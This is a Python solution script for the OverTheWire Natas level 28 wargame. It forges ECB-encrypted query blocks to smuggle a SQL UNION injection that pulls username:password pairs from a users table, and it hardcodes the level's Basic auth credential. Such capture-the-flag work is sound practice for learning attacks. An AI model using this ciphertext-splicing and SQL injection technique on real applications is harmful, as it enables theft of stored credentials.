import re
from base64 import b64decode, b64encode
from urllib.parse import unquote

import requests

natas_url = 'http://natas28.natas.labs.overthewire.org/index.php'
search_url = 'http://natas28.natas.labs.overthewire.org/search.php/?query='

# authorization header
headers = {'Authorization': 'Basic bmF0YXMyODpKV3dSNDM4d2tnVHNOS0JiY0pvb3d5eXNkTTgyWWplRg=='}

# pad plaintext to ensure it takes up a full ciphertext block
plaintext = 'A' * 10 + 'B' * 14
resp = requests.post(natas_url, data={'query': plaintext}, headers=headers)

# get the raw bytes of the ciphertext
encoded_ciphertext = resp.url.split('query=')[1]
ciphertext = b64decode(unquote(encoded_ciphertext))

# sql to inject into ciphertext query
new_sql = ' UNION ALL SELECT concat(username,0x3A,password) FROM users #'

# pad plaintext to ensure it also takes up a whole number of ciphertext blocks
plaintext = 'A' * 10 + new_sql + 'B' * (16 - (len(new_sql) % 16))
offset = 48 + len(plaintext) - 10

resp = requests.post(natas_url, data={'query': plaintext}, headers=headers)
encoded_new_ciphertext = resp.url.split('query=')[1]
new_ciphertext = b64decode(unquote(encoded_new_ciphertext))
encrypted_sql = new_ciphertext[48:offset]

# add the encrypted new sql into the final ciphertext
final_ciphertext = ciphertext[:64] + encrypted_sql + ciphertext[64:]
resp = requests.get(search_url, params={'query': b64encode(final_ciphertext)}, headers=headers)

print(re.findall('<li>(.*?)</li>', resp.text)[0])
